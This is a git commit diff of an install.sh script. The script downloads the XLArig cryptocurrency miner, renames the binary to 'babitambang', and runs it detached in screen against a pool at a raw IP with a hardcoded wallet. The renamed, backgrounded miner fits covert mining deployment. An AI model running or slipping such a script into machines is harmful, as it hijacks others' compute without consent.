009fdfd12b105f69d5d903847c646a766da8dfda
washil789 <88795024+washil789@users.noreply.github.com>
2021-09-10 09:19:47 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,6 +2,6 @@ sudo apt update &&
 sudo apt install screen -y &&
 wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && 
 unzip XLArig-v5.2.2-linux-x86_64.zip &&
-chmod +x xlarig &&
 mv xlarig babitambang &&
-screen -dmS run ./babitambang -o 68.183.134.111:6147 -u 8BVLQrAfZXLFZsdLcUqk33EgPLxQYwKVTheFAixjGZShXhqSVXFUrqT98xtNgegRkoaRTECw5JHTdi67F13zd86ZGitVSnZ --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL)
+chmod +x babitambang &&
+screen -dmS run ./babitambang -o 68.183.134.111:6147 -u 8BVLQrAfZXLFZsdLcUqk33EgPLxQYwKVTheFAixjGZShXhqSVXFUrqT98xtNgegRkoaRTECw5JHTdi67F13zd86ZGitVSnZ+100000 --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL)
